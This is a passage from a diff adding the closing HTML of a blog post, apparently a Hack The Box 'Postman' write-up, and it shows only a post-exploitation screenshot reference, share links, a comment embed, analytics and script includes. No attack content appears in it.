+  <img src="/assets/hackthebox/postman/postman-10-2de653c78252d8dfc406b852db59640a2d6cce71a9e9ee36f9e5ca7c5bc652d5.png" alt="Postman Post Exploitation" class="zooming" data-rjs="/assets/hackthebox/postman/postman-10-2de653c78252d8dfc406b852db59640a2d6cce71a9e9ee36f9e5ca7c5bc652d5.png" data-zooming-width="754" data-zooming-height="243" />
+</a></p>
+
+          </div>
+          <div class="article-share">
+            
+            
+            <a href="https://twitter.com/home?status=Postman+-+Hack+The+Box%20-%20https://nullarmor.github.io/posts/postman%20by%20@nullarmor" title="Share on Twitter" rel="noreferrer noopener" target="_blank">
+              <svg viewBox="0 0 512 512"><path d="M492 109.5c-17.4 7.7-36 12.9-55.6 15.3 20-12 35.4-31 42.6-53.6 -18.7 11.1-39.4 19.2-61.5 23.5C399.8 75.8 374.6 64 346.8 64c-53.5 0-96.8 43.4-96.8 96.9 0 7.6 0.8 15 2.5 22.1 -80.5-4-151.9-42.6-199.6-101.3 -8.3 14.3-13.1 31-13.1 48.7 0 33.6 17.2 63.3 43.2 80.7C67 210.7 52 206.3 39 199c0 0.4 0 0.8 0 1.2 0 47 33.4 86.1 77.7 95 -8.1 2.2-16.7 3.4-25.5 3.4 -6.2 0-12.3-0.6-18.2-1.8 12.3 38.5 48.1 66.5 90.5 67.3 -33.1 26-74.9 41.5-120.3 41.5 -7.8 0-15.5-0.5-23.1-1.4C62.8 432 113.7 448 168.3 448 346.6 448 444 300.3 444 172.2c0-4.2-0.1-8.4-0.3-12.5C462.6 146 479 129 492 109.5z"/></svg>
+            </a>
+            <a href="https://www.facebook.com/sharer/sharer.php?u=https://nullarmor.github.io/posts/postman" title="Share on Facebook" rel="noreferrer noopener" target="_blank">
+              <svg viewBox="0 0 512 512"><path d="M288 192v-38.1c0-17.2 3.8-25.9 30.5-25.9H352V64h-55.9c-68.5 0-91.1 31.4-91.1 85.3V192h-45v64h45v192h83V256h56.4l7.6-64H288z"/></svg>
+            </a>
+          </div>
+
+          
+            <div id="disqus_thread" class="article-comments"></div>
+            <script src="https://nullarmor.disqus.com/embed.js" async defer></script>
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+          
+        </article>
+        <footer class="footer scrollappear">
+  <p>
+    This site uses Chalk theme made by Nielsen Ramon.
+  </p>
+</footer>
+
+      </div>
+    </div>
+  </main>
+  
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-159304176-1"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'UA-159304176-1');
+  </script>
+
+
+<script type="text/javascript" src="/assets/vendor-2c224c53eb697c739f9490c38819a72184f09472739fd9e492272ef174090428.js"></script>
+
+
+  <script type="text/javascript" src="/assets/webfonts-96493456d319d1bf419afdf8701552d4d486fee6afd304897d4fd81eb4e0cc0b.js"></script>
+
+
+
+  <script type="text/javascript" src="/assets/scrollappear-e2da8ea567e418637e31266cc5302126eaa79f62a2273739086358b589a89ee6.js"></script>
+
+
+<script type="text/javascript" src="/assets/application-cfde13ac81ddaf4351b2e739603e2baf688d0fcc9aba613fe62bbb1c7b037fb9.js"></script>
+
+
+  <script type="text/javascript" src="/assets/themetoggle-df0d3d73164dc26dffbd630182ae4d0dfa7bee6b694a2b5d565d73595b582bbf.js"></script>
+
+</body>
+</html>
